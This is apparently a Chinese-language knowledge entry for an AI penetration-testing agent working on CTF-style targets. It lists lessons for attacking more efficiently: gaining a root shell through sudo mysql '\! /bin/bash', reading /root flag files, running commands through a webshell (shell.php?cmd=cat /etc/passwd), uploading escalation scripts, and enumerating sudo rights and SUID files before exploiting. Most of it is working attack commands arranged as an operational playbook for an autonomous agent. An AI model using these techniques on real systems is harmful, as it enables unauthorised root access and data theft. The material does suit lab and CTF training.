knowledge: '# AI攻击教训总结

  ## 核心原则：先检查，再利用

  AI 常犯错误：跳过信息收集步骤，直接尝试利用。

  **正确流程**：`信息收集 → 权限检查 → 选择利用方法 → 执行 → 获取成果`

  ---

  ## 1. 权限提升的正确顺序

  ### 错误示范

  ```
  ❌ 直接尝试：sudo mysql -e 'cat /root/flag.txt'
  ❌ 输出报错：Syntax error: Unterminated quoted string
  ❌ 陷入循环：反复尝试各种读取方法（base64、strings、od、grep、python...）
  ```

  ### 正确流程

  ```
  ✓ Step 1: sudo -l                    # 先检查有什么 sudo 权限
  ✓ Step 2: 分析 sudo 权限             # 查看允许的命令和限制
  ✓ Step 3: 选择合适的利用方法         # mysql、find、vim、git 等
  ✓ Step 4: 构造正确的命令             # 注意引号和特殊字符
  ✓ Step 5: 执行并获取 flag            # 一次性成功
  ```

  ### MySQL Sudo 提权

  ```bash
  # 方法1：使用 \! 执行系统命令
  sudo mysql -e '\! cat /root/flag.txt'
  sudo mysql -e '\! find / -name "*flag*" 2>/dev/null'

  # 方法2：进入 mysql 后执行
  sudo mysql
  mysql> \! cat /root/flag.txt
  mysql> \! /bin/bash                  # 获取 root shell

  # 注意：\! 后面的命令不能有复杂引号嵌套
  ```

  ---

  ## 2. Webshell 环境特殊处理

  ### 问题识别

  ```
  当命令输出包含：
  - ThinkPHP 错误页面
  - 空白 HTML 页面
  - "页面错误！请稍后再试～"

  说明：命令执行有问题，不是命令本身的问题
  ```

  ### Webshell 命令技巧

  ```bash
  # 1. 避免复杂引号嵌套
  ❌ sudo mysql -e 'find / -name "*flag*"'
  ✓ sudo mysql -e '\! find / -name *flag*'

  # 2. 使用单引号包裹命令
  ✓ curl 'http://target/shell.php?cmd=whoami'

  # 3. URL 编码特殊字符
  ✓ curl 'http://target/shell.php?cmd=cat%20/etc/passwd'

  # 4. 分步执行复杂操作
  ✓ 先上传脚本，再执行脚本
  ```

  ---

  ## 3. 常见错误类型

  ### A. 命令构造错误

  ```bash
  # 引号未闭合
  ❌ sudo mysql -e 'cat "/root/flag.txt"'
  ✓ sudo mysql -e '\! cat /root/flag.txt'

  # 特殊字符未转义
  ❌ grep -r "flag{.*}" /root/
  ✓ grep -r "flag{" /root/ | head -20

  # 命令拼接错误
  ❌ cat /root/flag.txt; echo done
  ✓ sudo mysql -e '\! cat /root/flag.txt'
  ```

  ### B. 循环陷阱识别

  ```
  当同一类型的操作尝试 3+ 次：
  - 重复读取文件（不同方法都失败）
  - 重复执行命令（每次都是相同错误）

  STOP！分析根本原因：
  1. 命令执行环境不对？
  2. 权限不够？
  3. 命令构造有问题？

  不要继续尝试相同类型的方法
  ```

  ### C. 信息收集跳过

  ```bash
  # 必做检查（在利用之前）
  ✓ sudo -l          # sudo 权限
  ✓ whoami           # 当前用户
  ✓ id               # 用户组
  ✓ find / -perm -4000 2>/dev/null   # SUID 文件

  # Windows 必做
  ✓ whoami /priv     # 用户权限
  ✓ whoami /groups   # 用户组
  ✓ systeminfo       # 系统信息
  ```

  ---

  ## 4. AI 决策改进点

  ### A. 执行前思考

  ```
  Before calling any tool:

  1. What am I trying to achieve?
  2. What information do I need first?
  3. What is the simplest way to do this?
  4. Have I checked necessary prerequisites?

  Example:
  ❌ 直接尝试：sudo mysql -e 'cat flag.txt'
  ✓ 先检查：sudo -l → 发现 (root) NOPASSWD: mysql
  ✓ 再执行：sudo mysql -e '\! cat /root/flag.txt'
  ```

  ### B. 错误时分析

  ```
  When error occurs:

  1. Read error message carefully
  2. Check if it's environment limitation
  3. Check if command syntax is correct
  4. Don't repeat same approach 3+ times

  Example:
  ❌ 尝试10种读取方法都失败 → 继续尝试第11种
  ✓ 分析：输出都是 ThinkPHP 错误页 → 命令执行环境有问题
  ✓ 解决：改用正确的 mysql 提权语法
  ```

  ### C. 选择最优方法

  ```
  当有多种方法时：

  优先级：
  1. 现成工具（sudo -l, linpeas, winpeas）
  2. 已知漏洞利用脚本（searchsploit, nuclei）
  3. 手动构造最小化命令

  避免：
  - 穷举所有可能（浪费时间）
  - 复杂命令（容易出错）
  ```

  ---

  ## 5. 经验案例

  ### 案例1：MySQL Sudo 提权

  **错误**：直接构造复杂 bash 命令，引号嵌套错误

  **正确**：
  ```bash
  # 1. 检查 sudo 权限
  sudo -l
  # 输出：(root) NOPASSWD: /usr/bin/mysql

  # 2. 使用 mysql \! 命令
  sudo mysql -e '\! cat /root/flag/flag01.txt'

  # 3. 如果需要复杂操作
  sudo mysql -e '\! find / -type f -name *flag* 2>/dev/null'
  ```

  ### 案例2：Webshell 环境执行

  **错误**：反复尝试各种文件读取方法，输出都是 ThinkPHP 错误页

  **正确**：
  ```bash
  # 分析：webshell 执行环境限制

  # 方法1：蚁剑/冰蝎连接后直接执行
  # 方法2：上传提权脚本再执行
  # 方法3：使用简单命令（避免复杂引号）
  ```

  ---

  ## 6. Checkpoint 清单

  在尝试利用前，检查是否完成：

  ```
  [ ] sudo -l 已执行
  [ ] 当前用户权限已确认
  [ ] SUID 文件已查找（Linux）
  [ ] 可写目录已查找
  [ ] 内核版本已获取（Linux）
  [ ] 服务信息已收集（Windows）

  如果以上都没做 → 先做信息收集，不要直接利用
  ```

  ---

  ## 总结

  **AI 应做到**：
  1. 每次工具调用前，briefly 说明目的和原因
  2. 错误时分析根本原因，不盲目重复
  3. 信息收集在利用之前
  4. 选择最简单、最可靠的方法
  5. 复杂操作分步执行

  **AI 应避免**：
  1. 跳过 sudo -l 直接尝试利用
  2. 命令构造复杂引号嵌套
  3. 重复尝试同一类型方法 3+ 次
  4. 不分析错误原因就换方法
  5. 穷举所有可能的方法

  '